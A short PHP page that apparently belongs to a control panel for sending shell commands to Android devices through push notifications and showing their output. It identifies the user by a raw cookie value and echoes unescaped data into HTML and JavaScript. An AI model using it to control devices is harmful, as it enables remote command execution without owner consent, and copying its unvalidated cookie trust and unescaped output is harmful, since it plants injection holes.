<?php
	include 'include/config.php';
	include 'include/db.php';

	dbconnect();

	include 'include/checklogin.php';

	$id = $_GET['id'];
	$shell = getImg($_COOKIE['user_id'], $id);
	$message = getMessage($_COOKIE['user_id'], $id);
	$gcm_regid = getRegID($_COOKIE['user_id'], $id);
	echo '<nobr>';
	echo '<textarea id="shell_cmd" rows="1" cols="95">',trim(substr($message,6)),'</textarea><br>';
	echo '<button onClick="sendPushNotification(\'',$gcm_regid,'\',\'Command:ShellCmd:\'+$(\'#shell_cmd\').val());">send</button>';
	echo '</nobr><p>';
	$json = json_decode($shell);
	echo '<b>OUTPUT</b><p>';
	echo '<pre>'.$json->{'output'}.'</pre>';
	echo '<p><b>ERROR</b><p>';
	echo '<pre>'.$json->{'error'}.'</pre>';
	dbclose();
?>